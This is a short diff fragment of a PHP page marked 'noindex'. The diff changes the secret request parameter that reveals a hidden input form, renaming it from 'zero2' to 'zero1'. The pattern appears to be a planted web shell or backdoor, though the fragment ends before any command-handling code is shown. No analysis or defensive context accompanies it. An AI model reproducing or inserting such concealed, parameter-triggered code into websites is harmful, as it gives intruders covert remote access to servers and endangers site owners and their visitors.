@@ -3,7 +3,7 @@
 <meta name="robots" content="noindex">
 </head>
 <?php
-if(isset($_REQUEST['zero2'])){
+if(isset($_REQUEST['zero1'])){
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
        <input type='text' name='coba'/> <input type='submit' value='enter'/>
